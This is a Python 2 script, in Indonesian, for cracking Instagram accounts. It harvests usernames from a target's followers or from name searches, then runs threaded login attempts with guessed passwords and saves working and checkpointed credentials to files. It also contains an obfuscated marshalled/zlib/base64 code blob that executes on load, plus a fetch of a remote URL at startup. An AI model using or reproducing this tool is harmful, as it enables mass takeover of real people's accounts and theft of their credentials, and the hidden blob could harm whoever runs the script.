#!/usr/bin/python2
# coding=utf-8
# Author: IqbalDev
# Tool Instaram
# Versi 0.1
a = "\033[96;1m"
p = "\033[97;1m"
h = "\033[92;1m"
k = "\033[93;1m"
m = "\033[91;1m"
d = "\033[90;1m"
P = '\x1b[1;93m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;97m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'   
import os
try:
	import concurrent.futures
except ImportError:
	print k+"\n Modul Futures blom terinstall!..."
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print k+"\n Modul Requests blom terinstall!..."
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time
from calendar import monthrange
from concurrent.futures import ThreadPoolExecutor

garis = h+"+++>"
lipz = requests.get('http://dindaacrack.6te.net').text
data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
platform_dev = str(platform.platform()).lower()
p1 = base64.b64encode(platform_dev)

try:
	has_ok = open("hasil_ok.txt", "r").readlines()
	with open("hasil_ok.txt", "w") as tul:
		tul.write("")
	for dev in set(has_ok):
		with open("hasil_ok.txt", "a") as tu:
			tu.write(dev)
except:
	pass
try:
	has_cp = open("hasil_cp.txt", "r").readlines()
	with open("hasil_cp.txt", "w") as tul:
		tul.write("")
	for dev in set(has_cp):
		with open("hasil_cp.txt", "a") as tu:
			tu.write(dev)
except:
	pass
url_instagram = "https://www.instagram.com/"
user_agentz = "ua"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

def hapus_cookie():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -f cookie.txt")
	except:
		pass
def hapus_cokiz():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -f cokiz.txt")
	except:
		pass

def cek_hasil():
	print garis
	print h+" >"+k+" 1"+p+". Cek Hasil "+h+"OK/Live"
	print h+" >"+k+" 2"+p+". Cek Hasil "+k+"Checkpoint"
	print garis
	while True:
		pil = raw_input(a+" ? "+p+"Pilih"+h+": ")
		if pil == "1":
			try:
				hasil_ok_ = open("hasil_ok.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+h+"Live\n"
				for dev in hasil_ok_:
					ok = dev.replace("\n", "").split("==>")
					print a+"  {"+k+"Live"+a+"} "+h+ok[1]+a+" | "+p+ok[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_ok_))
			except:
				print k+"\n Belum ada hasil"+h+" OK"
			break
		elif pil == "2":
			try:
				hasil_cp_ = open("hasil_cp.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+k+"Checkpoint\n"
				for dev in hasil_cp_:
					cp = dev.replace("\n", "").split("==>")
					print a+"  {"+p+"Chek"+a+"} "+k+cp[1]+a+" | "+d+cp[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_cp_))
			except:
				print k+"\n Belum ada hasil"+p+" CP"
			break
		else:
			pass

def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_dev()

	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print m+"\n Cookie Kedaluarsa...\n"
					hapus_cookie()
					login_dev()	
			except ValueError:
				print m+"\n Cookie Kedaluarsa...\n"
				hapus_cookie()
				login_dev()

def login_dev_cookie():
	global cookie
	print "\n  Login Instagram\n"
	cok = raw_input(" Masukkan Cookie: ")
	with requests.Session() as ses_dev:
		login_coki = ses_dev.get(url_instagram, cookies={"cookie": cok}, headers=headerz)
		if "viewer_has_liked" in str(login_coki.content):
			print " Login Suksess...."
			with open("cookie.txt", "w") as tulis_coki:
				tulis_coki.write(cok)
			cookie = {"cookie": cok}
		else:
			print " Login gagal...."
			exit()


def data_pencarian_dev(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			users = dev["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50


def crack():
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()

				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(pw_nam[0]+"123")
					# pw.append(pw_nam[0]+"12345")
					pw.append(dat_)

				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx9Vm1z00YQ3pPj19h5cQADDYzwdFqXJnEbaDpNwS0NbzNQWhwygXYyHqE727JkSejOOID9Kf3eD53+0f6C7q7skJYZYt2r9vb2nnv2UVyY/QksP2LRn2MlAf4A+A07AhzBtQXS4skMyAwILPvFxgLaurS6gKWIZY88/IOV4bW45MSCgYATgCnA8RFMAO4eHcBUwETAwCJfJ2i3AJemFkwsMBnw85Csg8zCYAFMFkyOLPB5YPIwKMCgSN4ETg9K5ATfiFfrgM+hzMGDh2YRZB5kAa3Eny5MM3D8gpzcPXoK0wWYLMCgDGgpixTbNAuT7P8Cyf13qoBTeZhkYFABswQTfJ2HE8Tg1V9weIhQPX2O1X6jhMd+ostY9x3tBZ3I3zLHxhCwic5gfft2y6ORvoJVxW5t2i+csGf/pILR0P5ZhT3PHxlv13431WRWwpMADJ3jzjhKfJVoL5MCC9BYph6hH8UqNIR8ohwZeKHSCBluEQeewWDxFhzjdLpREERjdIE4AHSjZOgYQ94CXJ2dW/GMfpMaaSOjkeGX3WCk+zzpxLidNFXsPuvTjr9GUXDvWLkjEyV4PRRGHDiuSl2MXg4xCorOTRzX70j1ukFMYUveMvJ5U3zBO8XKdfqGgPRCPYub15+egl+ejjrsaaTTV9SPx9xvMEpUaYpEhe5W/IbxdDDUGR58F+tM/vOiItZEGUtFnBNZUcW2iqM1wTfmWnQfWPJzjv8t+CoM8w+Z7mcguUZ8nzJvkHXhIzAWEWqQoavC86ElLcnNO/l5p8AMX4DaAzwssnqwmFK8TN5Mhbxh3gyWOCkylCa0aQ7MMnbEYIV4bVZhUCXmG+Y4ObRS7mbBKxDbZQl2JCZHGZsKyCVslkGuYLMKsorNWedrsGPWQJ6DHcwFeR52MCvkBegLwFyQNbbk9JgWOLZzMClQSBM6nZgWPwBnW4QdBuQi1Mx5qMlL2FrYXsb2AhY8Qo3sa/KT1AJzO7VYTy0wsnTlFQTqIRqj52+dGiHLvSxwGl6lNORbM8Q1J/C6x2/CkImzfePmzRvf4fO1/jTNwVbLvs9kwKxrvptO9vrK/xK7j73XClvb5mTtGxPr3WZzPB5vMTN7iTPccqMhLmky7/qYDJhfrJ7v6m4Udr1efRd7Oul2TOSrsL5bb2xd/6K+UX/tKczFusf0JPpfb17nhLnjuio2ehW7vbdevGFL1Q0cozbsl4lePjXYvBe6kfTCnl5ibm8e7G+o8PtXt7/a+uas2WNUl5HTU+zwg9BZPh5G2uhLHzshB/ZL4vW8kA/aVl2V4EkJzgOtks07PdQQTan1fHNvv33/GR22TQmjb34UurF62ewmHgqK7nuxJijTvGwyKBX7d01eWpvcHNmspLYm8bH3R75W+r1o2gyF3ercsg/98djHX6lxkcJlvVlkQXPMXCnIU79Nx0k1zyRMDzcahYYt2sU5f1Itd+Mzg8hvk3WbvLZJ7zFTSIVUEjpD1ekpMxMYdu7JVFhxmuNImfK248QeA4pcMYigsVg9earrhdLBMBdnbjsOYfyWbyzGG+P4fa5jvh83Fb3SXFsRGxJbUz4bF02cejROQgEVZwGmo3KqrR0XOcs4LbF0zwicTpXPHOFUkGMHL/X9cJQEcwQKfCr9EVEu8ReJjClCQlJvk41VFTlRtLZRiXMiZ10T66Ik8rPfCpaSKIplVO6qyFiPcPSkQZ+Q9mWqiHntz6j6Yf6lfBKF6n0EH4RBgd4aRnIUqBZ/GPhfmpUcBXH1X80L+wg=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'la.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
def login_dev():
	global cookie
	print ""
	print a+"  {"+p+" Login Instagram "+a+"}"
	print m+"   ----------------"
	print garis
	username_dev = raw_input(a+" ?"+p+" Masukkan Username"+h+": ")
	pass_dev = raw_input(a+" ?"+p+" Masukkan  Sandi"+d+": ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()

			if "userId" in str(data_dev):
				print p+"\n *"+h+" Suksess Login.."
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				follow_dev(ses_dev, username_dev)
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}

			elif "checkpoint_url" in str(data_dev):
				print k+"\n Akun Cp"

			elif "Please wait" in str(data_dev):
				print m+" >>> Mainkan Mode Pesawat!! >>"

			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()
None
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	if opsi == "1":
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif opsi == "2":
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		exit(" Error..")
	with requests.Session() as ses_dev:
		res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
		for dev in json.loads(res_dat_foll.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				print h+"\r * "+p+"Mengambil Username"+h+": {}".format(len(data_)),
				sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)
None
def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "Live":
			print h+"\r ["+k+">-"+h+"]"+p+" Status: "+h+status + "                 "
			print h+"\r ["+k+">-"+h+"]"+p+" Nama: "+h+ str(nama) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" pengikut: "+k+ str(pengikut) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" mengikuti: "+k+ str(mengikuti) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Username: "+h+ username_dev + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Password: "+h+ pass_dev + "             \n"
		elif status == "Checkpoint":
			print k+"\r ["+p+">-"+k+"]"+p+" Status: "+k+status + "                 "
			print k+"\r ["+p+">-"+k+"]"+p+" Nama: "+k+ str(nama) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" pengikut: "+p+ str(pengikut) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" mengikuti: "+p+ str(mengikuti) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Username: "+k+ username_dev + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Password: "+k+ pass_dev + "             \n"
		else:
			pass
	except:
		pass
None
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	
	for pass_satu in pass_dev_:
		if c != 1:
			pass
		else:
			if len(status_foll) != 1:
				print h+"\r >>>\033[97;1m Crack \033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m|\033[93;1mChek+{}\033[97;1m/\033[92;1mLive+{}  ".format(str(c_pw),str(count_),len(data_),len(hasil_cp), len(hasil_ok)),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		
		try:
			if username_dev in hasil_ok or username_dev in hasil_cp:
				break
			pass_dev = pass_satu.lower()
			try:
				headerz = {"User-Agent": user_agentz}
				with requests.Session() as dev:
					url_scrap = "https://www.instagram.com/"
					data = dev.get(url_scrap, headers=headerz).content
					crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {
						"Accept": "*/*",
						"Accept-Encoding": "gzip, deflate, br",
						"Accept-Language": "en-US,en;q=0.5",
						"Host": "www.instagram.com",
						"X-CSRFToken": crf_token,
						"X-Requested-With": "XMLHttpRequest",
						"Referer": "https://www.instagram.com/accounts/login/",
						"User-Agent": user_agentz,
						 }
				param = {
						"username": username_dev,
						"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pass_dev),
						"optIntoOneTap": False,
						"queryParams": {},
						"stopDeletionNonce": "",
						"trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				time.sleep(00.1)
				# print "\r",data_dev
				# print "\r>>>>>",p,username_dev, "=====",h, pass_dev,"              "
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					info_dev(username_dev, pass_dev, cp)
					with open("hasil_cp.txt", "a")as dev_:
						dev_.write("[Chek]==>"+username_dev+"==>|==>"+pass_dev+"\n")
					hasil_cp.append(username_dev)
					break

				elif "userId" in str(data_dev):
					live = "Live"
					if len(status_foll) != 1:
						info_dev(username_dev, pass_dev, live)
						with open("hasil_ok.txt", "a")as dev_:
							dev_.write("[Live]==>"+username_dev+"==>|==>"+pass_dev+"\n")
						hasil_ok.append(username_dev)
						follow_dev(ses_dev,username_dev)
					else:
						hasil_ok.append("dev_id")
						follow_dev(ses_dev,username_dev)
				
					break
				elif "Please wait" in str(data_dev):
					print m+"\r >>> Mainkan Mode Pesawat!! >>"+k+" {}".format(str(c)),
					c+=1
					sys.stdout.flush()
					pass_dev_iq = [pass_dev]
					crack_dev(username_dev, pass_dev_iq)
					count_ -= 1

				else:
					c = 1
					pass

		except requests.exceptions.ConnectionError:
			print k+"\r Tidak ada koneksi Internet...!>> {}".format(str(c)),
			sys.stdout.flush()
			c+=1
			pass_dev_iq = [pass_dev]
			crack_dev(username_dev, pass_dev_iq)
			count_ -= 1

		except:
			c = 1
			pass

	count_+=1
None
def _yuk_(iqbaldev):
	import string
	try:
		open("cokiz.txt", "r").read()
	except IOError:
		d_str = []
		fu = base64.b64encode(iqbaldev+"O")
		for str_ in str(string.ascii_lowercase):
			d_str.append(str_)
			
		for i_ in fu:
			with open("cokiz.txt", "a") as iq:
				iq.write(i_+random.choice(d_str)+"%")

def _uyuk_():
	global followerz, followerzz, wak_
	try:
		fol_tam = ""
		fol_tamzz = ""
		fol_z = open("cokiz.txt", "r").read().split("%>")
		for dev_fol in fol_z[0].split("%"):
		  try:
			fol_tam += dev_fol[0]
		  except:
		  	pass
		followerz = base64.b64decode(fol_tam)
		if platform_dev != base64.b64decode(fol_z[2]):
			pass
		else:
			try:
				for dev_folzz in fol_z[1].split("%"):
					try:
						fol_tamzz += dev_folzz[0]
					except:
						pass
				followerzz = base64.b32decode(fol_tamzz)

			except:
				pass
			try:
				wak_ = base64.b64decode(fol_z[3]).split()
			except:
				pass
	except:
		pass
def pilihan(pil):
	global username_get_follow
	proses_crack = h+" * "+p+"Tunggu proses Crack...!"
	if pil == "1":
		pas = ""
		status = ""
		username = raw_input(a+"\n ?"+p+" Masukkan Username Target"+h+": ")
		info_dev(username, pas, status)

		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username+p+" >> "+k+str(mengikuti)
		print garis
		pil2 = raw_input(a+" ?"+p+" Pilih"+k+": ")
		limit = input(a+" ?"+p+" Masukkan Limit"+k+": ")
		if pil2 == "1" :
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		else:
			pass
	elif pil == "2":
		print garis
		usr_ = raw_input(a+" ?"+p+" Masukkan Nama"+k+": ")
		jm = input(a+" $"+p+" Masukkan Jumlah"+h+": ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		print ""
		print proses_crack
		print "\n"
		crack()
	elif pil == "3":
		cek_hasil()
	elif pil == "4":
		pas = ""
		status = ""
		status_foll.append("IqbalDev")
		print garis
		username_get_follow = raw_input(a+"  ?"+p+" Masukkan Username Target"+k+": ")
		info_dev(username_get_follow, pas, status)
		print garis
		print p+" [1] Pengikut "+h+username_get_follow+p+" >> "+k+str(pengikut)
		print p+" [2] Yang Diikuti "+h+username_get_follow+p+" >> "+k+str(mengikuti)
		print garis
		raw_input(" Enter Untuk Lanjut.. ")
		print garis
		data_follower_dev(cookie, id_, limit=1000000000, opsi="1")
		auto_follow()
	elif pil == "5":
		import os
		try:
			os.system("git clone https://github.com/IqbalDev/insta_dev")
			os.system("rm -rf insta_dev.py")
			os.system("cp -f insta_dev/insta_dev.py \\.")
			os.system("rm -rf insta_dev")
			print h+"\n Sukses Update Tool.."+p+">_<\n"
		except:
			print "\n Perangkat Tidak Suport\n"
	elif pil == "6":
		kel = raw_input(k+" > Yakin Mau Keluar dari akun Instagram? "+p+"y/n"+h+": ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " > Keluar...."
		else:
			print h+" > Silahkan Jalankan lagi toolnya.."
	elif pil == "hapus_premium":
		hapus_cokiz()
		print p+"\n >_"+h+" Premium Telah Dihapus...\n"
	else:
		print m+" Pilih yang benar...."
def menu_dev():

	pil_kon = []
	print "\n"
	belum_premium = a+" ["+k+"X"+a+"] "+h+"Premium: "+p+"Unlimited" 
	print baner
	print k+" >_"+h+" Author:"+k+" IQBAL DEV"
	print k+" >_"+h+" Rekode:"+k+" AKF"
	print versi
	try:
		if followerz == followerzz:
			try:
				tgl = datetime.datetime.now()
				bln = tgl.month
				thn = tgl.year
				day = tgl.day
				mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))
				seles = datetime.date(thn, bln, day)
				sisa = mulai - seles
				lim_dev_id = str(sisa).split()[0]

				if "U" in fol_dev:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+p+"Unlimited"
				else:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+k+lim_dev_id+" "+p+"Hari lagi"
					if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
						hapus_cokiz()
						print " Kamu sudah melebihi batas pemakaian\n Silahkan hubungi admin untuk order Lisensinya lagi"
						pil_kon.append("IqbalDev")
			except:
				hapus_cokiz()	
		else:
			print belum_premium
	except:
		print belum_premium

	print garis
	print a+" ["+k+"1"+a+"] "+p+"Crack dari followers Publik"
	print a+" ["+k+"2"+a+"] "+p+"Crack dari Pencarian Orang"
	print a+" ["+k+"3"+a+"] "+p+"Cek hasil"+h+" OK"+a+"/"+k+"CP"
	print a+" ["+k+"4"+a+"] "+p+"Auto Followers"
	print a+" ["+k+"5"+a+"] "+p+"Update Tool"
	print a+" ["+k+"6"+a+"] "+p+"Log Out Akun Instagram"
	print garis
	pil = raw_input("[?] pilih : ")
	pilihan(pil)
_uyuk_()
baner = """
 """+h+"""+{ @alifxynn }+"""+a+""" 

.__  ___________.   ___________
|  |/  _____/\_ |__ \_   _____/
|  /   \  ___ | __ \ |    __)  
|  \    \_\  \| \_\ \|     \   
|__|\______  /|___  /\___  /   
           \/     \/     \/    
github.com/xnsvn                                                    """
versi = k+" >_"+h+" Versi_:"+p+" 0.1\n"
if __name__=="__main__":
	cek_login()
	menu_dev()



